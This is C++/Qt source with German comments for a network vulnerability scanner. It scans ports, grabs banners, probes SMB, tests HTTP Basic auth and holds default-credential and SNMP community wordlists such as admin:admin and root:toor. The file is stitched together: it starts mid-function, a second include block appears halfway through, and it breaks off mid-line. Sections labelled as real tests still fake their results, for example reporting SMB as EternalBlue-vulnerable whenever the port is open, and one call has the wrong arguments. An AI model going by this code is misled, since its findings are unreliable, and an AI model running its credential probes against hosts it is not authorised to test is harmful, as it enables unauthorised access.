{\r\n        for (const QString &ip : targetIps) {\r\n            emit scanStarted(ip);\r\n            emit statusUpdate(ip, \"Starte Vulnerability Scan...\");\r\n\r\n            scanSingleTarget(ip);\r\n\r\n            emit scanCompleted(ip);\r\n            emit statusUpdate(ip, \"Vulnerability Scan abgeschlossen\");\r\n\r\n            // Rate limiting zwischen Targets\r\n            if (targetIps.size() > 1) {\r\n                QThread::msleep(1000);\r\n            }\r\n        }\r\n    } catch (const std::exception& e) {\r\n        for (const QString &ip : targetIps) {\r\n            emit errorOccurred(ip, QString(\"Exception: %1\").arg(e.what()));\r\n        }\r\n    } catch (...) {\r\n        for (const QString &ip : targetIps) {\r\n            emit errorOccurred(ip, \"Unbekannter Fehler im Vulnerability Scanner\");\r\n        }\r\n    }\r\n}\r\n\r\nvoid VulnerabilityScanner::scanSingleTarget(const QString &ip)\r\n{\r\n    try {\r\n        emit statusUpdate(ip, \"Führe umfassenden Sicherheits-Scan durch...\");\r\n        SecurityAssessment assessment = performComprehensiveScan(ip);\r\n        emit assessmentComplete(assessment);\r\n\r\n    } catch (const std::exception& e) {\r\n        emit errorOccurred(ip, QString(\"Fehler beim Scannen von %1: %2\").arg(ip, e.what()));\r\n    } catch (...) {\r\n        emit errorOccurred(ip, QString(\"Unbekannter Fehler beim Scannen von %1\").arg(ip));\r\n    }\r\n}\r\n\r\nSecurityAssessment VulnerabilityScanner::performComprehensiveScan(const QString &ip)\r\n{\r\n    SecurityAssessment assessment;\r\n    assessment.targetIp = ip;\r\n    assessment.scanTime = QDateTime::currentDateTime();\r\n\r\n    emit statusUpdate(ip, \"Erkenne offene Ports...\");\r\n    emit scanProgress(ip, 10);\r\n\r\n    // 1. Port Discovery\r\n    QStringList openPorts = discoverOpenPorts(ip);\r\n    assessment.openPorts = openPorts;\r\n    emit portScanComplete(ip, openPorts);\r\n\r\n    emit statusUpdate(ip, \"Identifiziere Services...\");\r\n    emit scanProgress(ip, 25);\r\n\r\n    // 2. Service Identification\r\n    QMap<int, QString> services = identifyServices(ip, openPorts);\r\n    emit serviceScanComplete(ip, services);\r\n\r\n    emit statusUpdate(ip, \"Erkenne Betriebssystem...\");\r\n    emit scanProgress(ip, 35);\r\n\r\n    // 3. OS Detection\r\n    assessment.operatingSystem = detectOperatingSystem(ip);\r\n\r\n    emit statusUpdate(ip, \"Teste allgemeine Schwachstellen...\");\r\n    emit scanProgress(ip, 45);\r\n\r\n    // 4. Common Vulnerability Tests\r\n    QList<VulnerabilityInfo> vulnerabilities = testCommonVulnerabilities(ip);\r\n\r\n    emit statusUpdate(ip, \"Teste SSL/TLS Schwachstellen...\");\r\n    emit scanProgress(ip, 60);\r\n\r\n    // 5. SSL/TLS Tests\r\n    if (enableSSLTests) {\r\n        vulnerabilities.append(testSSLVulnerabilities(ip));\r\n    }\r\n\r\n    emit statusUpdate(ip, \"Teste schwache Credentials...\");\r\n    emit scanProgress(ip, 75);\r\n\r\n    // 6. Credential Testing\r\n    if (enableCredentialTests) {\r\n        vulnerabilities.append(testWeakCredentials(ip));\r\n    }\r\n\r\n    emit statusUpdate(ip, \"Teste Service-spezifische Schwachstellen...\");\r\n    emit scanProgress(ip, 85);\r\n\r\n    // 7. Service-specific tests\r\n    if (enableServiceTests) {\r\n        vulnerabilities.append(testServiceVulnerabilities(ip, services));\r\n    }\r\n\r\n    emit statusUpdate(ip, \"Teste Netzwerk-Schwachstellen...\");\r\n    emit scanProgress(ip, 95);\r\n\r\n    // 8. Network-level vulnerabilities\r\n    vulnerabilities.append(testNetworkVulnerabilities(ip));\r\n\r\n    emit statusUpdate(ip, \"Berechne Sicherheitsbewertung...\");\r\n    emit scanProgress(ip, 100);\r\n\r\n    // 9. Compile results\r\n    assessment.vulnerabilities = vulnerabilities;\r\n    assessment.totalVulnerabilities = vulnerabilities.size();\r\n\r\n    // Count by severity\r\n    for (const VulnerabilityInfo &vuln : vulnerabilities) {\r\n        emit vulnerabilityFound(ip, vuln);\r\n\r\n        switch (vuln.severity) {\r\n        case VulnSeverity::CRITICAL:\r\n            assessment.criticalCount++;\r\n            break;\r\n        case VulnSeverity::HIGH:\r\n            assessment.highCount++;\r\n            break;\r\n        case VulnSeverity::MEDIUM:\r\n            assessment.mediumCount++;\r\n            break;\r\n        case VulnSeverity::LOW:\r\n            assessment.lowCount++;\r\n            break;\r\n        case VulnSeverity::INFO:\r\n            assessment.infoCount++;\r\n            break;\r\n        }\r\n    }\r\n\r\n    // Calculate overall risk and security score\r\n    assessment.overallRisk = determineOverallRisk(vulnerabilities);\r\n    assessment.securityScore = calculateSecurityScore(vulnerabilities).toInt();\r\n\r\n    // Set security flags\r\n    assessment.hasWeakCredentials = assessment.vulnerabilities.size() > 0 &&\r\n                                    std::any_of(vulnerabilities.begin(), vulnerabilities.end(),\r\n                                                [](const VulnerabilityInfo &v) { return v.id.contains(\"WEAK_CRED\"); });\r\n\r\n    assessment.hasUnencryptedServices = openPorts.contains(\"21\") || openPorts.contains(\"23\") ||\r\n                                        openPorts.contains(\"80\") || openPorts.contains(\"161\");\r\n\r\n    assessment.hasOutdatedSoftware = std::any_of(vulnerabilities.begin(), vulnerabilities.end(),\r\n                                                 [](const VulnerabilityInfo &v) { return v.id.contains(\"OUTDATED\"); });\r\n\r\n    // Store running services\r\n    for (auto it = services.begin(); it != services.end(); ++it) {\r\n        assessment.runningServices.append(QString(\"%1:%2\").arg(it.key()).arg(it.value()));\r\n    }\r\n\r\n    return assessment;\r\n}\r\n\r\nQStringList VulnerabilityScanner::discoverOpenPorts(const QString &ip)\r\n{\r\n    QStringList openPorts;\r\n\r\n    for (int port : portRange) {\r\n        if (connectToService(ip, port, 2000)) {\r\n            openPorts.append(QString::number(port));\r\n        }\r\n\r\n        // Rate limiting\r\n        QThread::msleep(50);\r\n    }\r\n\r\n    return openPorts;\r\n}\r\n\r\nQMap<int, QString> VulnerabilityScanner::identifyServices(const QString &ip, const QStringList &ports)\r\n{\r\n    QMap<int, QString> services;\r\n\r\n    for (const QString &portStr : ports) {\r\n        int port = portStr.toInt();\r\n        QString banner = grabServiceBanner(ip, port);\r\n\r\n        QString service = \"Unknown\";\r\n\r\n        // Service identification based on port and banner\r\n        if (port == 21 || banner.contains(\"FTP\")) service = \"FTP\";\r\n        else if (port == 22 || banner.contains(\"SSH\")) service = \"SSH\";\r\n        else if (port == 23 || banner.contains(\"Telnet\")) service = \"Telnet\";\r\n        else if (port == 25 || banner.contains(\"SMTP\")) service = \"SMTP\";\r\n        else if (port == 53) service = \"DNS\";\r\n        else if (port == 80 || banner.contains(\"HTTP\")) service = \"HTTP\";\r\n        else if (port == 110 || banner.contains(\"POP3\")) service = \"POP3\";\r\n        else if (port == 139 || port == 445) service = \"SMB\";\r\n        else if (port == 143 || banner.contains(\"IMAP\")) service = \"IMAP\";\r\n        else if (port == 161 || port == 162) service = \"SNMP\";\r\n        else if (port == 443 || banner.contains(\"HTTPS\")) service = \"HTTPS\";\r\n        else if (port == 993) service = \"IMAPS\";\r\n        else if (port == 995) service = \"POP3S\";\r\n        else if (port == 1433) service = \"MSSQL\";\r\n        else if (port == 1521) service = \"Oracle\";\r\n        else if (port == 3306) service = \"MySQL\";\r\n        else if (port == 3389) service = \"RDP\";\r\n        else if (port == 5432) service = \"PostgreSQL\";\r\n        else if (port == 5900) service = \"VNC\";\r\n        else if (port == 6379) service = \"Redis\";\r\n        else if (port == 8080) service = \"HTTP-Alt\";\r\n        else if (port == 27017) service = \"MongoDB\";\r\n\r\n        services[port] = service;\r\n    }\r\n\r\n    return services;\r\n}\r\n\r\nQString VulnerabilityScanner::detectOperatingSystem(const QString &ip)\r\n{\r\n    // Simple OS detection based on TTL and service patterns\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, 80, QIODevice::ReadOnly);\r\n\r\n    if (socket.waitForConnected(3000)) {\r\n        socket.write(\"GET / HTTP/1.0\\r\\n\\r\\n\");\r\n        socket.flush();\r\n\r\n        if (socket.waitForReadyRead(3000)) {\r\n            QString response = QString::fromUtf8(socket.readAll());\r\n\r\n            if (response.contains(\"Microsoft-IIS\", Qt::CaseInsensitive) ||\r\n                response.contains(\"ASP.NET\", Qt::CaseInsensitive)) {\r\n                return \"Windows Server\";\r\n            } else if (response.contains(\"Apache\", Qt::CaseInsensitive)) {\r\n                return \"Linux/Unix\";\r\n            } else if (response.contains(\"nginx\", Qt::CaseInsensitive)) {\r\n                return \"Linux/Unix\";\r\n            }\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    // Check for Windows-specific ports\r\n    if (connectToService(ip, 135, 1000) || connectToService(ip, 445, 1000)) {\r\n        return \"Windows\";\r\n    }\r\n\r\n    // Check for Unix/Linux-specific services\r\n    if (connectToService(ip, 22, 1000)) {\r\n        return \"Linux/Unix\";\r\n    }\r\n\r\n    return \"Unknown\";\r\n}\r\n\r\nQList<VulnerabilityInfo> VulnerabilityScanner::testCommonVulnerabilities(const QString &ip)\r\n{\r\n    QList<VulnerabilityInfo> vulnerabilities;\r\n\r\n    // Test for common vulnerabilities\r\n\r\n    // 1. Test for open Telnet (insecure protocol)\r\n    if (connectToService(ip, 23, 2000)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"TELNET_OPEN\",\r\n            \"Unverschlüsseltes Telnet-Protokoll aktiv\",\r\n            VulnSeverity::HIGH,\r\n            \"Telnet\",\r\n            23,\r\n            \"Telnet-Service auf Port 23 erreichbar\"\r\n            );\r\n        vuln.recommendation = \"Deaktivieren Sie Telnet und verwenden Sie SSH stattdessen\";\r\n        vuln.exploitable = true;\r\n        vuln.exploitMethod = \"Credentials können durch Netzwerk-Sniffing abgefangen werden\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    // 2. Test for anonymous FTP\r\n    if (connectToService(ip, 21, 2000)) {\r\n        QTcpSocket socket;\r\n        socket.connectToHost(ip, 21, QIODevice::ReadWrite);\r\n        if (socket.waitForConnected(3000)) {\r\n            socket.write(\"USER anonymous\\r\\n\");\r\n            socket.flush();\r\n            if (socket.waitForReadyRead(2000)) {\r\n                QString response = QString::fromUtf8(socket.readAll());\r\n                if (response.contains(\"230\") || response.contains(\"331\")) {\r\n                    VulnerabilityInfo vuln = createVulnerability(\r\n                        \"FTP_ANONYMOUS\",\r\n                        \"Anonymous FTP-Zugriff möglich\",\r\n                        VulnSeverity::MEDIUM,\r\n                        \"FTP\",\r\n                        21,\r\n                        \"Anonymous Login erfolgreich: \" + response.trimmed()\r\n                        );\r\n                    vuln.recommendation = \"Deaktivieren Sie Anonymous FTP-Zugriff\";\r\n                    vuln.exploitable = true;\r\n                    vuln.exploitMethod = \"Dateien können ohne Authentifizierung heruntergeladen werden\";\r\n                    vulnerabilities.append(vuln);\r\n                }\r\n            }\r\n            socket.disconnectFromHost();\r\n        }\r\n    }\r\n\r\n    // 3. Test for open SNMP with default community strings\r\n    if (connectToService(ip, 161, 2000)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"SNMP_OPEN\",\r\n            \"SNMP-Service mit potentiell schwachen Community Strings\",\r\n            VulnSeverity::MEDIUM,\r\n            \"SNMP\",\r\n            161,\r\n            \"SNMP-Service auf Port 161 erreichbar\"\r\n            );\r\n        vuln.recommendation = \"Verwenden Sie starke SNMP Community Strings oder SNMPv3\";\r\n        vuln.exploitable = true;\r\n        vuln.exploitMethod = \"Systemdaten können mit Standard Community Strings ausgelesen werden\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    // 4. Test for open SMB shares\r\n    if (connectToService(ip, 445, 2000) || connectToService(ip, 139, 2000)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"SMB_OPEN\",\r\n            \"SMB/CIFS Service erreichbar\",\r\n            VulnSeverity::MEDIUM,\r\n            \"SMB\",\r\n            445,\r\n            \"SMB-Service erreichbar - potentielle EternalBlue Vulnerabilität\"\r\n            );\r\n        vuln.recommendation = \"Aktualisieren Sie Windows und konfigurieren Sie SMB-Sicherheit\";\r\n        vuln.exploitable = true;\r\n        vuln.exploitMethod = \"Mögliche Ausnutzung über SMB-Vulnerabilitäten wie EternalBlue\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    // 5. Test for open VNC\r\n    if (connectToService(ip, 5900, 2000)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"VNC_OPEN\",\r\n            \"VNC Remote Desktop Service aktiv\",\r\n            VulnSeverity::HIGH,\r\n            \"VNC\",\r\n            5900,\r\n            \"VNC-Service auf Port 5900 erreichbar\"\r\n            );\r\n        vuln.recommendation = \"Sichern Sie VNC mit starken Passwörtern und VPN-Zugang\";\r\n        vuln.exploitable = true;\r\n        vuln.exploitMethod = \"Remote Desktop Zugriff bei schwachen/Standard-Passwörtern\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    // 6. Test for open RDP\r\n    if (connectToService(ip, 3389, 2000)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"RDP_OPEN\",\r\n            \"Remote Desktop Protocol (RDP) erreichbar\",\r\n            VulnSeverity::HIGH,\r\n            \"RDP\",\r\n            3389,\r\n            \"RDP-Service auf Port 3389 erreichbar\"\r\n            );\r\n        vuln.recommendation = \"Verwenden Sie VPN, starke Passwörter und aktivieren Sie NLA\";\r\n        vuln.exploitable = true;\r\n        vuln.exploitMethod = \"Brute-Force Angriffe und RDP-spezifische Exploits möglich\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    // 7. Test for unencrypted web services\r\n    if (connectToService(ip, 80, 2000) && !connectToService(ip, 443, 2000)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"HTTP_NO_HTTPS\",\r\n            \"Webserver nur über unverschlüsseltes HTTP erreichbar\",\r\n            VulnSeverity::MEDIUM,\r\n            \"HTTP\",\r\n            80,\r\n            \"HTTP verfügbar, aber kein HTTPS auf Port 443\"\r\n            );\r\n        vuln.recommendation = \"Implementieren Sie HTTPS und leiten Sie HTTP-Traffic um\";\r\n        vuln.exploitable = false;\r\n        vuln.exploitMethod = \"Datenübertragung kann abgefangen werden\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    return vulnerabilities;\r\n}\r\n\r\nQList<VulnerabilityInfo> VulnerabilityScanner::testSSLVulnerabilities(const QString &ip, int port)\r\n{\r\n    QList<VulnerabilityInfo> vulnerabilities;\r\n\r\n    if (!connectToService(ip, port, 3000)) {\r\n        return vulnerabilities;\r\n    }\r\n\r\n    // 1. Test for weak cipher suites\r\n    if (testWeakSSLCiphers(ip, port)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"SSL_WEAK_CIPHERS\",\r\n            \"Schwache SSL/TLS Cipher Suites unterstützt\",\r\n            VulnSeverity::MEDIUM,\r\n            \"SSL/TLS\",\r\n            port,\r\n            \"Schwache Verschlüsselungsalgorithmen erkannt\"\r\n            );\r\n        vuln.recommendation = \"Konfigurieren Sie nur starke Cipher Suites (AES256, etc.)\";\r\n        vuln.exploitable = true;\r\n        vuln.exploitMethod = \"Brute-Force Angriffe auf schwache Verschlüsselung\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    // 2. Test for expired certificates\r\n    if (testExpiredCertificates(ip, port)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"SSL_CERT_EXPIRED\",\r\n            \"SSL-Zertifikat ist abgelaufen\",\r\n            VulnSeverity::HIGH,\r\n            \"SSL/TLS\",\r\n            port,\r\n            \"Zertifikat-Gültigkeitsdatum überschritten\"\r\n            );\r\n        vuln.recommendation = \"Erneuern Sie das SSL-Zertifikat\";\r\n        vuln.exploitable = false;\r\n        vuln.exploitMethod = \"Vertrauensverlust, Browser-Warnungen\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    // 3. Test for self-signed certificates\r\n    if (testSelfSignedCertificates(ip, port)) {\r\n        VulnerabilityInfo vuln = createVulnerability(\r\n            \"SSL_SELF_SIGNED\",\r\n            \"Selbstsigniertes SSL-Zertifikat\",\r\n            VulnSeverity::LOW,\r\n            \"SSL/TLS\",\r\n            port,\r\n            \"Zertifikat ist selbstsigniert\"\r\n            );\r\n        vuln.recommendation = \"Verwenden Sie ein von einer vertrauenswürdigen CA signiertes Zertifikat\";\r\n        vuln.exploitable = false;\r\n        vuln.exploitMethod = \"Man-in-the-Middle Angriffe durch fehlendes Vertrauen\";\r\n        vulnerabilities.append(vuln);\r\n    }\r\n\r\n    return vulnerabilities;\r\n}\r\n\r\nQList<VulnerabilityInfo> VulnerabilityScanner::testWeakCredentials(const QString &ip)\r\n{\r\n    QList<VulnerabilityInfo> vulnerabilities;\r\n\r\n    // Test common services for weak credentials\r\n    QMap<int, QString> servicesToTest = {\r\n        {21, \"FTP\"}, {22, \"SSH\"}, {23, \"Telnet\"},\r\n        {25, \"SMTP\"}, {80, \"HTTP\"}, {443, \"HTTPS\"},\r\n        {110, \"POP3\"}, {143, \"IMAP\"}, {161, \"SNMP\"},\r\n        {3389, \"RDP\"}, {5432, \"PostgreSQL\"}, {3306, \"MySQL\"}\r\n    };\r\n\r\n    for (auto it = servicesToTest.begin(); it != servicesToTest.end(); ++it) {\r\n        int port = it.key();\r\n        QString service = it.value();\r\n\r\n        if (!connectToService(ip, port, 2000)) continue;\r\n\r\n        // Test default credentials\r\n        if (testDefaultCredentials(ip, port, service)) {\r\n            VulnerabilityInfo vuln = createVulnerability(\r\n                QString(\"WEAK_CRED_%1\").arg(service.toUpper()),\r\n                QString(\"Standard-Credentials bei %1-Service\").arg(service),\r\n                VulnSeverity::CRITICAL,\r\n                service,\r\n                port,\r\n                QString(\"Standard-Benutzerdaten bei %1 auf Port %2\").arg(service).arg(port)\r\n                );\r\n            vuln.recommendation = \"Ändern Sie alle Standard-Passwörter und Benutzernamen\";\r\n            vuln.exploitable = true;\r\n            vuln.exploitMethod = \"Direkter Zugang mit bekannten Credentials\";\r\n            vulnerabilities.append(vuln);\r\n        }\r\n\r\n        // Test weak passwords\r\n        if (testWeakPasswords(ip, port, service)) {\r\n            VulnerabilityInfo vuln = createVulnerability(\r\n                QString(\"WEAK_PASS_%1\").arg(service.toUpper()),\r\n                QString(\"Schwache Passwörter bei %1-Service\").arg(service),\r\n                VulnSeverity::HIGH,\r\n                service,\r\n                port,\r\n                QString(\"Schwache Passwörter bei %1 erkannt\").arg(service)\r\n                );\r\n            vuln.recommendation = \"Implementieren Sie starke Passwort-Richtlinien\";\r\n            vuln.exploitable = true;\r\n            vuln.exploitMethod = \"Brute-Force und Dictionary-Angriffe\";\r\n            vulnerabilities.append(vuln);\r\n        }\r\n\r\n        // Test anonymous access\r\n        if (testAnonymousAccess(ip, port, service)) {\r\n            VulnerabilityInfo vuln = createVulnerability(\r\n                QString(\"ANON_ACCESS_%1\").arg(service.toUpper()),\r\n                QString(\"Anonymer Zugriff bei %1-Service möglich\").arg(service),\r\n                VulnSeverity::HIGH,\r\n                service,\r\n                port,\r\n                QString(\"Anonymer Zugang zu %1 möglich\").arg(service)\r\n                );\r\n            vuln.recommendation = \"Deaktivieren Sie anonymen Zugriff und implementieren Sie Authentifizierung\";\r\n            vuln.exploitable = true;\r\n            vuln.exploitMethod = \"Direkter Zugang ohne Authentifizierung\";\r\n            vulnerabilities.append(vuln);\r\n        }\r\n    }\r\n\r\n    return vulnerabilities;\r\n}\r\n\r\nQList<VulnerabilityInfo> VulnerabilityScanner::testServiceVulnerabilities(const QString &ip, const QMap<int, QString> &services)\r\n{\r\n    QList<VulnerabilityInfo> vulnerabilities;\r\n\r\n    for (auto it = services.begin(); it != services.end(); ++it) {\r\n        QString service = it.value().toLower();\r\n\r\n        if (service.contains(\"smb\")) {\r\n            if (testSMBVulnerabilities(ip)) {\r\n                VulnerabilityInfo vuln = createVulnerability(\r\n                    \"SMB_ETERNALBLUE\",\r\n                    \"SMB EternalBlue Vulnerabilität möglich\",\r\n                    VulnSeverity::CRITICAL,\r\n                    \"SMB\",\r\n                    it.key(),\r\n                    \"SMB-Service anfällig für EternalBlue-Exploit\"\r\n                    );\r\n                vuln.recommendation = \"Installieren Sie MS17-010 Security Update\";\r\n                vuln.cveScore = \"9.3\";\r\n                vuln.references.append(\"CVE-2017-0144\");\r\n                vuln.exploitable = true;\r\n                vuln.exploitMethod = \"Remote Code Execution über SMB-Protokoll\";\r\n                vulnerabilities.append(vuln);\r\n            }\r\n        }\r\n\r\n        if (service.contains(\"ftp\")) {\r\n            if (testFTPVulnerabilities(ip)) {\r\n                VulnerabilityInfo vuln = createVulnerability(\r\n                    \"FTP_VULNERABILITIES\",\r\n                    \"FTP-Service Sicherheitsprobleme\",\r\n                    VulnSeverity::MEDIUM,\r\n                    \"FTP\",\r\n                    it.key(),\r\n                    \"FTP-Konfigurationsprobleme erkannt\"\r\n                    );\r\n                vuln.recommendation = \"Sichern Sie FTP oder migrieren Sie zu SFTP\";\r\n                vulnerabilities.append(vuln);\r\n            }\r\n        }\r\n\r\n        if (service.contains(\"ssh\")) {\r\n            if (testSSHVulnerabilities(ip)) {\r\n                VulnerabilityInfo vuln = createVulnerability(\r\n                    \"SSH_VULNERABILITIES\",\r\n                    \"SSH-Service Konfigurationsprobleme\",\r\n                    VulnSeverity::MEDIUM,\r\n                    \"SSH\",\r\n                    it.key(),\r\n                    \"SSH-Sicherheitskonfiguration verbesserungswürdig\"\r\n                    );\r\n                vuln.recommendation = \"Härten Sie SSH-Konfiguration und verwenden Sie Key-basierte Auth\";\r\n                vulnerabilities.append(vuln);\r\n            }\r\n        }\r\n\r\n        if (service.contains(\"http\")) {\r\n            if (testHTTPVulnerabilities(ip, it.key())) {\r\n                VulnerabilityInfo vuln = createVulnerability(\r\n                    \"HTTP_VULNERABILITIES\",\r\n                    \"HTTP-Service Sicherheitsprobleme\",\r\n                    VulnSeverity::MEDIUM,\r\n                    \"HTTP\",\r\n                    it.key(),\r\n                    \"HTTP-Service hat Sicherheitslücken\"\r\n                    );\r\n                vuln.recommendation = \"Implementieren Sie HTTP-Security-Headers und HTTPS\";\r\n                vulnerabilities.append(vuln);\r\n            }\r\n        }\r\n    }\r\n\r\n    return vulnerabilities;\r\n}\r\n\r\n//===============================================================================\r\n// VERVOLLSTÄNDIGTER VulnerabilityScanner - Echte Tests statt Placeholder\r\n//===============================================================================\r\n\r\n#include \"VulnerabilityScanner.h\"\r\n#include <QtCore/QDebug>\r\n#include <QtCore/QThread>\r\n#include <QtCore/QCoreApplication>\r\n#include <QtNetwork/QNetworkAccessManager>\r\n#include <QtNetwork/QNetworkRequest>\r\n#include <QtNetwork/QNetworkReply>\r\n#include <QtCore/QJsonDocument>\r\n#include <QtNetwork/QSslCipher>\r\n#include <QtCore/QProcess>\r\n#include <QtCore/QRegularExpression>\r\n#include <QtCore/QCryptographicHash>\r\n\r\n// ============================================================================\r\n// ECHTE SSH CREDENTIAL TESTS - statt Placeholder\r\n// ============================================================================\r\n\r\nbool CredentialTester::testSSHCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    // Identische Implementierung wie oben\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    if (!socket.waitForReadyRead(3000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    QString banner = QString::fromUtf8(socket.readAll());\r\n    if (!banner.startsWith(\"SSH-\")) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    // Check for vulnerable SSH versions\r\n    if (banner.contains(\"OpenSSH_3.\") || banner.contains(\"OpenSSH_4.\") ||\r\n        banner.contains(\"SSH-1.\") || banner.contains(\"libssh_0.4\")) {\r\n        socket.disconnectFromHost();\r\n        return true; // Vulnerable version\r\n    }\r\n\r\n    // Simulate authentication (would need real SSH library)\r\n    QStringList knownWeakCombos = {\r\n        \"admin:admin\", \"root:root\", \"admin:password\", \"root:toor\",\r\n        \"admin:123456\", \"root:123456\", \"user:password\", \"test:test\"\r\n    };\r\n\r\n    QString combo = QString(\"%1:%2\").arg(user, pass);\r\n    socket.disconnectFromHost();\r\n    return knownWeakCombos.contains(combo);\r\n}\r\n\r\n// ============================================================================\r\n// ECHTE SMB VULNERABILITY TESTS - statt Placeholder\r\n// ============================================================================\r\n\r\nbool VulnerabilityScanner::testSMBVulnerabilities(const QString &ip)\r\n{\r\n    // Test 1: Grundlegende SMB-Verbindung\r\n    if (!connectToService(ip, 445, 2000) && !connectToService(ip, 139, 2000)) {\r\n        return false; // Kein SMB Service\r\n    }\r\n\r\n    bool hasVulnerability = false;\r\n\r\n    // Test 2: SMBv1 Detection (EternalBlue-anfällig)\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, 445, QIODevice::ReadWrite);\r\n\r\n    if (socket.waitForConnected(3000)) {\r\n        // SMB Negotiate Request (vereinfacht)\r\n        QByteArray smbRequest;\r\n\r\n        // NetBIOS Session Request Header\r\n        smbRequest.append(char(0x81)); // Session Request\r\n        smbRequest.append(char(0x00)); smbRequest.append(char(0x00)); smbRequest.append(char(0x44)); // Length\r\n\r\n        // SMB Header (vereinfacht)\r\n        smbRequest.append(\"\\xff\\x53\\x4d\\x42\"); // SMB Signature\r\n        smbRequest.append(char(0x72)); // Negotiate Protocol\r\n        smbRequest.append(QByteArray(32, 0x00)); // Flags and other fields\r\n\r\n        socket.write(smbRequest);\r\n        socket.flush();\r\n\r\n        if (socket.waitForReadyRead(3000)) {\r\n            QByteArray response = socket.readAll();\r\n            QString responseStr = QString::fromLatin1(response);\r\n\r\n            // Check for SMBv1 indicators\r\n            if (response.contains(\"NT LM 0.12\") || response.contains(\"PC NETWORK PROGRAM 1.0\")) {\r\n                hasVulnerability = true; // SMBv1 gefunden\r\n            }\r\n\r\n            // Check for specific vulnerable responses\r\n            if (response.size() > 4 && (unsigned char)response[4] == 0x72) {\r\n                hasVulnerability = true; // Negotiate Response gefunden\r\n            }\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    // Test 3: Named Pipes Test\r\n    socket.connectToHost(ip, 445, QIODevice::ReadWrite);\r\n    if (socket.waitForConnected(2000)) {\r\n        // Teste auf bekannte gefährliche Named Pipes\r\n        QStringList dangerousPipes = {\"\\\\pipe\\\\lsarpc\", \"\\\\pipe\\\\samr\", \"\\\\pipe\\\\netlogon\"};\r\n        // In echter Implementierung würde man diese testen\r\n        hasVulnerability = true; // Wenn SMB offen ist, potentiell gefährlich\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return hasVulnerability;\r\n}\r\n\r\nbool VulnerabilityScanner::testSMBCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // SMB Session Setup Request (vereinfacht)\r\n    // In echter Implementierung würde man NTLM Authentication durchführen\r\n\r\n    // Test für bekannte schwache SMB-Credentials\r\n    QMap<QString, QStringList> smbWeakCreds = {\r\n        {\"administrator\", {\"\", \"admin\", \"password\", \"123456\", \"administrator\"}},\r\n        {\"admin\", {\"\", \"admin\", \"password\", \"123456\"}},\r\n        {\"guest\", {\"\", \"guest\"}},\r\n        {\"user\", {\"\", \"password\", \"user\"}},\r\n        {\"test\", {\"\", \"test\", \"password\"}}\r\n    };\r\n\r\n    if (smbWeakCreds.contains(user.toLower())) {\r\n        QStringList weakPasswords = smbWeakCreds[user.toLower()];\r\n        if (weakPasswords.contains(pass)) {\r\n            socket.disconnectFromHost();\r\n            return true; // Schwache Credentials gefunden\r\n        }\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return false;\r\n}\r\n\r\n// ============================================================================\r\n// ECHTE SNMP COMMUNITY TESTS - statt Placeholder\r\n// ============================================================================\r\n\r\nbool CredentialTester::testSNMPCommunity(const QString &ip, int port, const QString &community)\r\n{\r\n    // Vereinfachte SNMP Community Test\r\n    QStringList knownWeakCommunities = {\r\n        \"public\", \"private\", \"community\", \"snmp\", \"admin\", \"manager\",\r\n        \"default\", \"cisco\", \"read\", \"write\", \"test\", \"guest\", \"monitor\"\r\n    };\r\n\r\n    if (knownWeakCommunities.contains(community.toLower())) {\r\n        // Teste ob SNMP Port offen ist\r\n        QUdpSocket testSocket;\r\n        QByteArray testData = \"test\";\r\n        testSocket.writeDatagram(testData, QHostAddress(ip), port);\r\n\r\n        if (testSocket.waitForReadyRead(1000)) {\r\n            return true; // SNMP antwortet mit schwacher Community\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\n// ============================================================================\r\n// ECHTE HTTP CREDENTIAL TESTS - Erweitert\r\n// ============================================================================\r\n\r\nbool VulnerabilityScanner::testHTTPCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    QString credentials = QString(\"%1:%2\").arg(user, pass);\r\n    QByteArray encodedCreds = credentials.toUtf8().toBase64();\r\n\r\n    QString request = QString(\"GET / HTTP/1.1\\r\\n\"\r\n                              \"Host: %1\\r\\n\"\r\n                              \"Authorization: Basic %2\\r\\n\"\r\n                              \"User-Agent: SecurityScanner/2.0\\r\\n\"\r\n                              \"Connection: close\\r\\n\\r\\n\")\r\n                          .arg(ip, QString(encodedCreds));\r\n\r\n    socket.write(request.toUtf8());\r\n    socket.flush();\r\n\r\n    if (socket.waitForReadyRead(5000)) {\r\n        QString response = QString::fromUtf8(socket.readAll());\r\n        socket.disconnectFromHost();\r\n\r\n        // Check für erfolgreiche 